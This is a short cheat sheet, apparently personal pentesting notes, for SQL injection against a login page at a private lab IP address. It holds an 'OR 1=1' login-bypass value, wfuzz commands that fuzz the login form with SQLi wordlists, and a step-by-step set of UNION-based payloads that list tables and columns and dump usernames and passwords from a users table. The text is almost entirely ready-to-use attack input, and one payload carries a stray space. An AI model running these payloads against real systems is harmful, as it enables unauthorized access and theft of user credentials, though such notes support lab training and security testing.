```bash
username=test%27 OR 1=1&password=pass

# Fuzzing with quick SQLi payloads 
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://192.168.205.10/login.php -p "127.0.0.1:8080:HTTP" 

# Fuzzing special characters 
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d "username=FUZZ&password=bar" -u  http://192.168.205.10/login.php -p "127.0.0.1:8080:HTTP"


```

```bash

########################################################
HACKTRACK commands
#######################################################
# Identify visible columns
'+union+select+'A1','B2','C3','D4','D5'--+-

# List the current database
'+union+select+'A1',database(),'C3','D4','D5'--+-

# List all tables inside current database
'+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+- 


# List all columns inside users table from the current database
'+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+- 

# Exfiltrate data from columns
'+union+select+'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','D5'+from+us ers--+-
```

